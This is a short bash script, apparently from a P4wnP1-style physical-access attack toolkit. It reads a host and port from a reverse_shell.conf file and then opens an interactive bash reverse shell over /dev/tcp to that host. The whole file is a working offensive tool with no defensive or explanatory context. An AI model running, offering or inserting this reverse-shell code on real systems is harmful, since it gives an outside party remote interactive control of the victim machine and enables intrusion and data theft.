#!/bin/bash

CONFIG="/opt/p4wnp1-o2/config/reverse_shell.conf"
[ -f "$CONFIG" ] && source "$CONFIG"

HOST="${RS_HOST}"
PORT="${RS_PORT}"

bash -i >& /dev/tcp/${HOST}/${PORT} 0>&1
